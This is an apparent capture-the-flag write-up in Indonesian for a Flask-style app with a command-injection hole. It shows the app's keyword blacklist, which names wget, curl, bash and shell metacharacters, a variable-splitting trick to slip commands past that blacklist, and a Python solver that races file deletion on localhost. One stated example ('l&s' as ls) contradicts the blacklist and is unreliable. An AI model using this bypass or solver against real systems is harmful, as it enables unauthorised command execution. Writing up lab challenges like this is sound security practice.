# Solve
Dapat diketahui terdapat sebuah kerentanan code injection di bagian:
```py
    process = subprocess.run(inputed, shell=True, capture_output=True, text=True)
    output = process.stdout
```

Namun terdapat blacklist seperti ini:
```py
    blacklist = [
    "ls", "cat", "rm", "mv", "id", "cp", "wget", "curl", "chmod", "chown", "find", "ps",
    "grep", "awk", "sed", "bash", "sh", "python", "perl", "php", "sudo", "whoami",
    "vi", "vim", "nano", "info", "uname", "more", "head", "less", "tail", "txt", "&&", "|", "`", "$(", ">", "<", "&", "'", '"', "*", "\n"
    ]
```

Untuk melakukan bypass, kita bisa menggunakan payload seperti berikut:

`s=s; l&s` == `ls`

Bila ingin melakukan listing directory, karena terdapat sleep sebesar 0.1 detik sebelum output file dihapus kita bisa menggunakan threading.

Sehingga didapat solver berikut:

```py
import requests
from datetime import datetime
import binascii
requests.packages.urllib3.disable_warnings()
import threading
import subprocess

url = "http://localhost:5000/"

s = requests.Session()

inputed = "d=d; i$d"

data_req = {
    "input": inputed,
    "submit": "Submit"
}

def exp_get_id():
    r = s.post(url + "get_quotes", data=data_req, verify=False)
    get_date_minute = datetime.now().strftime('%Y%m%d%H%M')
    random_number = binascii.hexlify(get_date_minute.encode()).decode()
    filename = f'{random_number}.txt'
    return filename

def get_response():
    r = s.get(url + "generated_quotes/" + exp_get_id(), verify=False)
    # print("Click the link: " + url + "generated_quotes/" + exp_get_id())
    print(r.text)

if __name__ == "__main__":
    threading.Thread(target=get_response).start()
```